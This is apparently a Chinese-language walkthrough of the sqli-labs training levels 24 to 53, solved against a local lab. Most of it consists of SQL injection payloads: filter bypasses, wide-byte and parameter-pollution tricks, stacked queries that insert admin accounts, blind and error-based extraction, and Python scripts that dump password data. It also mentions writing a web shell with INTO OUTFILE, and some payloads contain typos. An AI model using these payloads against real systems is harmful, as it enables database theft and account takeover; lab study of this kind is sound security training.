<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507091708950.png" alt="image-20210507091708950"></p>
<p>登录后可以更改用户的密码，此时可以随意修改密码，那么admin用户的密码就会被改成改密码</p>
<p>看看源码，分析原理</p>
<pre><code class="hljs PHP"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;
<span class="hljs-variable">$res</span> = mysql_query(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</code></pre>

<p>将用户名和密码带入</p>
<pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> #<span class="hljs-string">&#x27; and password=&#x27;</span>$curr_pass<span class="hljs-string">&#x27; &quot;;</span></code></pre>

<p>可以看到真正的sql语句为</p>
<pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span></code></pre>

<p>这杨就导致了admin用户密码被改变。</p>
<h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><p>这一关尝试可以发现，是将or和and替换成空</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093512147.png" alt="image-20210507093512147"></p>
<p>但是可以直接使用双写绕过，因为它只过滤了一次</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093742004.png" alt="image-20210507093742004"></p>
<p>所以还是可以使用union注入，就是要注意or和and单词需要双写。</p>
<h2 id="level25a"><a href="#level25a" class="headerlink" title="level25a"></a>level25a</h2><p>这一关和上一关一样是过滤了or和and，可以使用双写绕过，但是需要使用盲注</p>
<p>可以使用level8使用的脚本，对其payload稍加修改即可</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre>



<h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><p>26与上一关相比，很类似，空格，注释符和 / 也给过滤了</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507094649645.png" alt="image-20210507094649645" style="zoom:50%;">

<p>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：</p>
<pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB键（水平）
<span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行
<span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页
<span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return功能
<span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB键（垂直）
<span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符)</code></pre>

<p>可以使用报错注入或者盲注</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)&gt;&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>	
<span class="hljs-attribute">0</span>&#x27;||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(Select%<span class="hljs-number">0</span>a@@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span></code></pre>

<h2 id="level26a"><a href="#level26a" class="headerlink" title="level26a"></a>level26a</h2><p>与上一关一样，题目提示空格与注释被过滤了，可以使用<code>%a0</code>绕过，报错注入不出，可以用布尔盲注</p>
<pre><code class="hljs perl"><span class="hljs-number">0</span><span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>	<span class="hljs-comment">#探测为&#x27;</span>
<span class="hljs-number">0</span><span class="hljs-string">&#x27;||left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;%26%26&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>

白盒审计知道是<span class="hljs-string">&#x27;)</span>
<span class="hljs-string">0%27)%a0union%a0select%a01,database(),2||(&#x27;</span><span class="hljs-number">1</span>
<span class="hljs-number">0</span>%27)%a0union%a0select%a01,database(),<span class="hljs-number">2</span>;%00</code></pre>

<h2 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h2><p>题目提示<code>union</code>与<code>select</code>被过滤了，但是没有使用<code>preg_ireplace()</code>,所以可用大小写绕过</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095131602.png" alt="image-20210507095131602" style="zoom:50%;">

<pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>
<span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>

<span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre>

<h2 id="level27a"><a href="#level27a" class="headerlink" title="level27a"></a>level27a</h2><p>与27关基本一样，就是在id参数位置没有使用单引号闭合</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095515296.png" alt="image-20210507095515296"></p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095524859.png" alt="image-20210507095524859"></p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre>

<h2 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h2><p><code>union select</code>大小写均被过滤，但是<code>select</code>还可单独用，盲注即可，注意这里的id闭合方式为<code>(&#39;&#39;)</code></p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095639166.png" alt="image-20210507095639166" style="zoom:50%;">

<pre><code class="hljs matlab"><span class="hljs-number">0</span>&#x27;)||left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">%00</span></code></pre>

<h2 id="level28a"><a href="#level28a" class="headerlink" title="level28a"></a>level28a</h2><p>与28关相比，简单很多，只是过滤了<code>union select</code>,所以可以继续使用上面的payload</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095853009.png" alt="image-20210507095853009" style="zoom:50%;">

<pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;)||left((database()),<span class="hljs-number">1</span>)=&#x27;s&#x27;;%<span class="hljs-number">00</span>
<span class="hljs-attribute">0</span>&#x27;)||left((selEct%<span class="hljs-number">0</span>agroup_concat(schema_name)%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata),<span class="hljs-number">1</span>)&lt;&#x27;s&#x27;;%<span class="hljs-number">00</span></code></pre>

<h2 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h2><p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&amp;id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p>
<pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;%<span class="hljs-number">23</span></code></pre>

<h2 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h2><p>与 29 架构一样，原理一致只不过加了<code>&quot;</code>限制</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre>

<h2 id="level31"><a href="#level31" class="headerlink" title="level31"></a>level31</h2><p>架构一样，多了<code>&quot;)</code></p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre>

<h2 id="level32"><a href="#level32" class="headerlink" title="level32"></a>level32</h2><p>注意是<code>GBK</code>，可以用<code>%df</code>进行宽字节注入</p>
<p>宽字节注入</p>
<p>宽字节注入利用了mysql一个特性，<strong>即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字</strong>。（前一个ASCII码<strong>要大于128</strong>，才到汉字的范围）</p>
<p>先了解一下这些字符的url编码：</p>
<p><img src="https://segmentfault.com/img/bVbzjiJ" alt="image.png"></p>
<p>当输入单引号，经addslashes转义后，对应的url编码是：<br><strong>‘ –&gt; &#39; –&gt; %5C%27</strong><br>当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：<br><strong>%df –&gt; %df \ ‘ –&gt; （%df%5C）%27</strong></p>
<p>若使用gbk编码的话，<strong>%df%5C会被当作一个汉字处理</strong>，从而使%27（单引号）逃出生天，成功绕过</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span>
<span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre>

<h2 id="level33"><a href="#level33" class="headerlink" title="level33"></a>level33</h2><p>与32相同</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre>

<h2 id="level34"><a href="#level34" class="headerlink" title="level34"></a>level34</h2><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>�&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#
<span class="hljs-attribute">Password</span>: 任意</code></pre>



<h2 id="level35"><a href="#level35" class="headerlink" title="level35"></a>level35</h2><p>GET型宽字节注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
<p>payload:</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level36"><a href="#level36" class="headerlink" title="level36"></a>level36</h2><p>直接使用32关的payload</p>
<pre><code class="hljs n1ql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)--+</code></pre>

<h2 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h2><p>和less-34一样</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>�&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#
<span class="hljs-attribute">Password</span>: 任意</code></pre>



<h2 id="level38"><a href="#level38" class="headerlink" title="level38"></a>level38</h2><p>堆叠注入：可以执行多条语句，用分号间隔</p>
<p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的</p>
<p>可以使用create创建一张表</p>
<pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;;create <span class="hljs-built_in">table</span> test like users;<span class="hljs-comment">%23</span></code></pre>

<p>也可以向数据包中插入一条数据</p>
<pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre>

<h2 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h2><p>和38一样，只不过这里是数字型，无需闭合。</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level40"><a href="#level40" class="headerlink" title="level40"></a>level40</h2><p>闭合方式不同而已</p>
<p>payload</p>
<pre><code class="hljs n1ql">?id=1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre>

<h2 id="level41"><a href="#level41" class="headerlink" title="level41"></a>level41</h2><p>数字型注入与39关相同</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h2><p>与之前几关类似，不过这里的username位置进过滤，所以需要password位置进行堆叠注入</p>
<p>payload</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<p>点击登录后，会发现登录失败，但是inert语句已经被执行了，可以使用admin123账号直接登录</p>
<h2 id="level43"><a href="#level43" class="headerlink" title="level43"></a>level43</h2><p>与42的闭合方式不同</p>
<p>使用的是<code>(&#39;&#39;)</code></p>
<p>payload</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<h2 id="level44"><a href="#level44" class="headerlink" title="level44"></a>level44</h2><p>与42相同</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<h2 id="level45"><a href="#level45" class="headerlink" title="level45"></a>level45</h2><p>与43相同</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<h2 id="level46"><a href="#level46" class="headerlink" title="level46"></a>level46</h2><p><code>order by</code>注入</p>
<p><code>username</code>、<code>password</code>均为列名，所以以下需要知道列名</p>
<pre><code class="hljs pgsql">?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)
?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">null</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)
?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">then</span> username <span class="hljs-keyword">else</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">end</span>)
?<span class="hljs-keyword">order</span>=ifnull(<span class="hljs-keyword">null</span>, username)
?<span class="hljs-keyword">order</span>=rand(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)    //<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(<span class="hljs-number">1</span>)/rand(<span class="hljs-number">0</span>)两者返回不一样
?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> regexp <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x00</span>))</code></pre>

<p>将<code>1=1</code>换成bool盲注的语句函数即可用于获取数据<br><code>sort=rand(ascii(database(),1))=115)</code></p>
<p>时间盲注</p>
<pre><code class="hljs pgsql">sort=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))
sort=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(substring(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-type">char</span>(<span class="hljs-number">115</span>),benchmatrk(<span class="hljs-number">5000000</span>,md5(<span class="hljs-string">&#x27;1&#x27;</span>)),<span class="hljs-keyword">null</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1)</code></pre>

<p>Bool 盲注</p>
<pre><code class="hljs pgsql">rand(ascii(left(<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)</code></pre>

<p>报错注入：</p>
<pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)
(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,floor(rand()*<span class="hljs-number">2</span>)))</code></pre>

<p>procedure analyse 参数后注入</p>
<pre><code class="hljs cal">sort=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(extractvalue(rand()</span>,<span class="hljs-title">concat</span><span class="hljs-params">(0x3a,version()</span>)),1)</span></code></pre>

<p>into outfile参数:</p>
<pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfield <span class="hljs-string">&quot;path&quot;</span></code></pre>

<p>上传网马，可以在后面加上<code>lines terminated by 16</code>进制转码的数据</p>
<h2 id="level47"><a href="#level47" class="headerlink" title="level47"></a>level47</h2><p>与46的闭合防止不用，使用报错注入</p>
<pre><code class="hljs n1ql">?sort=1&#x27; and extractvalue(1,concat(0x7e,( <span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>))--+</code></pre>

<h2 id="level48"><a href="#level48" class="headerlink" title="level48"></a>level48</h2><p>使用时间盲注</p>
<pre><code class="hljs lisp"><span class="hljs-number">1</span> and If(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;115,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+
sort=rand(<span class="hljs-name">ascii</span>(<span class="hljs-name">left</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>))=115)</code></pre>

<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&#x27;http://127.0.0.1/Less-48/</span>
<span class="hljs-string">payloads = &#x27;</span>QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_<span class="hljs-string">&#x27;</span>
<span class="hljs-string">data = &#x27;</span><span class="hljs-string">&#x27;</span>
<span class="hljs-string">for i in range(50):</span>
<span class="hljs-string">    for j in payloads:</span>
<span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span>
<span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span>
<span class="hljs-string">        payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;       </span>
<span class="hljs-string">        try:</span>
<span class="hljs-string">            r = requests.get(url+payload, timeout=1)</span>
<span class="hljs-string">        except Exception:</span>
<span class="hljs-string">            data += j</span>
<span class="hljs-string">            print(data)</span>
<span class="hljs-string">            break</span></code></pre>

<h2 id="level49"><a href="#level49" class="headerlink" title="level49"></a>level49</h2><p>与47的闭合方式不同，但是可以使用盲注</p>
<pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>(<span class="hljs-params">database</span>()</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+
<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>((<span class="hljs-params">select</span> <span class="hljs-params">username</span> <span class="hljs-params">from</span> <span class="hljs-params">users</span> <span class="hljs-params">where</span> <span class="hljs-params">id</span>=1)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)))--+</code></pre>

<h2 id="level50"><a href="#level50" class="headerlink" title="level50"></a>level50</h2><p>order by与堆叠注入结合，数字型</p>
<p>payload:</p>
<pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507103942074.png" alt="image-20210507103942074" style="zoom:50%;">



<h2 id="level51"><a href="#level51" class="headerlink" title="level51"></a>level51</h2><p>与50关相比增加单引号闭合</p>
<pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level52"><a href="#level52" class="headerlink" title="level52"></a>level52</h2><p>与50相同</p>
<pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level53"><a href="#level53" class="headerlink" title="level53"></a>level53</h2><p>和51一样，只是不会回显错误，堆叠注入方式相同。</p>
